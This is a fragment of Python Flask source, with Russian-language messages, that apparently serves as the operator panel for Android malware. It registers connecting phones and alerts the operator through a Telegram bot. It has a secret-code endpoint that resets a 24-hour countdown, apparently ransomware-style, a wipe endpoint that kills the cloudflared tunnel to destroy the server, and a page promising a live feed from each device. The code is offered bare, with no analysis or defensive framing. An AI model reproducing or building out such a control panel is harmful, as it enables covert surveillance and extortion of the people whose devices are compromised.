@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST' and request.form.get('password') == PASSWORD:
        session['logged_in'] = True
        return redirect(url_for('dashboard'))
    return render_template_string(HTML_LOGIN)

@app.route('/dashboard')
def dashboard():
    if not session.get('logged_in'): return redirect(url_for('login'))
    return render_template_string(HTML_PANEL)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/api/devices')
def api_devices(): return jsonify(devices)

@app.route('/api/ping', methods=['POST'])
def api_ping():
    global chat_id
    data = request.get_json()
    dev_id = data.get('id')
    if dev_id:
        if dev_id not in devices:
            try:
                bot.send_message(chat_id, f"⚠️ Новое подключение: {data.get('name')} ({dev_id})")
            except: pass
        devices[dev_id] = {'name': data.get('name', 'Android'), 'online': True}
    return jsonify({"status": "ok"})

@app.route('/api/reset_timer', methods=['POST'])
def api_reset_timer():
    data = request.get_json()
    if data.get('code') == SECRET_CODE:
        return jsonify({"status": "ok", "message": "Таймер сброшен на 24 часа!"})
    return jsonify({"status": "error", "message": "Неверный код!"})

@app.route('/api/wipe', methods=['POST'])
def api_wipe():
    global devices
    devices = {}
    os.system("taskkill /f /im cloudflared.exe >nul 2>&1")
    return jsonify({"status": "ok", "message": "СЕРВЕР УНИЧТОЖЕН. ВСЕ ДАННЫЕ СТЕРТЫ."})

@app.route('/watch/<dev_id>')
def watch(dev_id):
    if not session.get('logged_in'): return redirect(url_for('login'))
    return "<h1 style='color:white;text-align:center;'>Эфир скоро появится...</h1>"

